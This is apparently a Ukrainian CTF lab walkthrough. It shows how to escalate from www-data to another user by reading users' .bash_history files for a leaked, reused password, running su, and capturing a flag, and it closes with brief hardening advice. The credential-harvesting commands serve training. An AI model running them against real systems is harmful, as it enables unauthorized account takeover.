# Task12 — «Сліди Попередників» (Horizontal PrivEsc через `.bash_history`)

## Мета
Стартуючи як `www-data`, знайти пароль, який офіцер **засвітив у history**, перейти в його акаунт і прочитати **flag** з його домашньої директорії.

---

## 1) Перевір, хто ти
```bash
whoami
```
Очікувано: `www-data`.

---

## 2) Прочитай записку з підказкою
```bash
cat /var/www/note.txt
```
Сенс: “джура-хроніст” = **історія команд** у покоях офіцерів → `~/.bash_history`.

---

## 3) Переконайся, що `/home` “не ліститься”, але доступний за шляхом
```bash
ls -ld /home
```
Норма для цього рівня: **`drwx--x--x` (711)** — список не покажеш, але зможеш читати конкретні файли, якщо знаєш шлях.

---

## 4) Знайди користувачів, у кого home в `/home`
Оскільки `/home` не ліститься, беремо список з `/etc/passwd`:
```bash
awk -F: '$6 ~ "^/home/" {print $1}' /etc/passwd
```
Очікувано:  
`sir_lancelot`, `sir_gawain`, `sir_percival`, `sir_galahad`.

---

## 5) Прочитай `.bash_history` кожного офіцера і знайди “reused password”
```bash
for u in $(awk -F: '$6 ~ "^/home/" {print $1}' /etc/passwd); do
  echo "===== $u ====="
  cat "/home/$u/.bash_history" 2>/dev/null
done
```

Що шукати:
- рядок типу `curl -u user:...`
- коментар/натяк **`reused password`**
- реальний пароль (не `tok_...`)

---

## 6) Перейди в акаунт офіцера з “reused password”
```bash
su - sir_lancelot
```
Введи пароль, який щойно дістав із `/home/sir_lancelot/.bash_history`.

---

## 7) Перевір, що ти вже офіцер
```bash
whoami
pwd
```
Очікувано: `sir_lancelot` і домашня директорія цього користувача.

---

## 8) Забери flag
Спочатку подивись, що лежить у home:
```bash
ls -la ~
```

Якщо файл флага неочевидний — знайди його:
```bash
find ~ -maxdepth 2 -type f \( -iname "*flag*" -o -iname "*.flag" \) 2>/dev/null
```

Прочитай:
```bash
cat <шлях_до_файлу_флага>
```

---

## Чому це працює (коротко)
- `.bash_history` офіцерів доступний для читання з-під `www-data`.
- Один офіцер **засвітив реальний пароль** у команді (і ще й повторно використав його як системний).
- Це дозволяє зробити **horizontal privilege escalation** через `su`.

---

## Захист (коротко)
- `chmod 600 ~/.bash_history` і коректні права на `/home/<user>`.
- Не передавати паролі в CLI (`curl -u user:pass ...`), використовувати токени/секрет-менеджер.
- Ротація секретів після інциденту.
